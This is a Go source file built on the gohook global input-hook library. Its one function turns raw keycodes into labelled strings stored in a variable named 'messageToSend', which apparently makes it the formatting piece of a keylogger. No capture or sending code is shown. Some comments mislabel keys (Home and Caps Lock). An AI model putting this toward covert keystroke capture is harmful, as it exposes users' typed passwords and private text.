package main

import (
	"fmt"

	hook "github.com/robotn/gohook"
)

func HandleKeyEvent(ev hook.Event) string {
	var messageToSend string

	// Handle special keys using Rawcode
	switch ev.Rawcode {
	case 65507: // Left Ctrl
		messageToSend = "[LEFT_CTRL]"
	case 65508: // Right Ctrl
		messageToSend = "[RIGHT_CTRL]"
	case 65505: // Left Shift
		messageToSend  = "[LEFT_SHIFT]"
	case 65506: // Right Shift
		messageToSend = "[RIGHT_SHIFT]"
	case 65509: // Shift key
		messageToSend = "[CAPS_LOCK]"
	case 65513: // Alt keys (left and right)
		messageToSend = "[ALT]"
	case 65027: // Alt keys (left and right)
		messageToSend = "[ALT_GR]"
	case 65288: // Backspace
		messageToSend = "[BACKSPACE]"
	case 65289: // Tab
		messageToSend = "[TAB]"				
	case 65293: // Enter
		messageToSend = "\n" // Treat Enter as a newline
	case 65307: // Escape
		messageToSend = "[ESC]"
	case 32: // Space
		messageToSend = " "
	case 65361: // Left Arrowrw
		messageToSend = "[LEFT]"
	case 65362: // Up Arrow
		messageToSend = "[UP]"
	case 65363: // Right Arrow
		messageToSend = "[RIGHT]"
	case 65364: // Down Arrow
		messageToSend = "[DOWN]"
	case 65365: // Page Up
		messageToSend = "[PAGEUP]"
	case 65366: // Page Down
		messageToSend = "[PAGEDOWN]"
	case 65367: // End
		messageToSend = "[END]"
	case 65515: // Home
		messageToSend = "[WINDOWS]"
	case 65379: // Insert
		messageToSend = "[INSERT]"
	case 65535: // Delete
		messageToSend = "[DELETE]"
	default:
		// Fallback for printable characters
		if ev.Keychar != 0 {
			messageToSend = string(ev.Keychar)
		} else {
			messageToSend = fmt.Sprintf("[RAWCODE_%d]", ev.Rawcode)
		}
	}

	return messageToSend
}